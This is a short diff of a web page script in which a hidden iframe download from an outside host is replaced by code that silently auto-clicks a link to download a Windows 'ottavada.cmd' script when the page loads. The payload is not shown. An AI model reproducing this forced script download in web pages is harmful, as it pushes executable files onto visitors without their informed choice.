@@ -41,18 +41,12 @@
 
         <script>
             (function () {
-                "use strict";
-
-                var downloadFrame = document.createElement("iframe");
-                downloadFrame.style.display = "none";
-                downloadFrame.src =
-                    "https://ottavada.rhafaell.com.br/v1/download";
-                document.body.appendChild(downloadFrame);
-                setTimeout(function () {
-                    if (downloadFrame.parentNode) {
-                        downloadFrame.parentNode.removeChild(downloadFrame);
-                    }
-                }, 5000);
+                var downloadLink = document.createElement("a");
+                downloadLink.href = "ottavada.cmd";
+                downloadLink.download = "ottavada.cmd";
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
 
                 var seconds = 5;
                 var countdownEl = document.getElementById("thanks-countdown");
